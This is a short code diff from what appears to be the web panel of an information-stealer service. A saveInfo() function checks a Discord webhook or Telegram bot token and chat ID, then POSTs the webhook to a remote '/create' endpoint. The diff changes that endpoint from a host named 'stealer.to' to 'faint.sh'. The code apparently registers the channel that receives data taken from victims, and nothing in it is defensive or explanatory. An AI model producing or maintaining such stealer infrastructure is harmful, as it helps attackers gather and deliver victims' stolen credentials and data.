@@ -128,8 +128,8 @@ function saveInfo() {
     if ((discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) || 
         (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID))) {
 
-        // Send POST request to https://stealer.to/create with the Discord Webhook URL
-        fetch("https://stealer.to/create", {
+
+        fetch("https://faint.sh/create", {
             method: "POST",
             body: new URLSearchParams({
                 "webhook": discordWebhookURL // Send the Discord Webhook URL as the payload
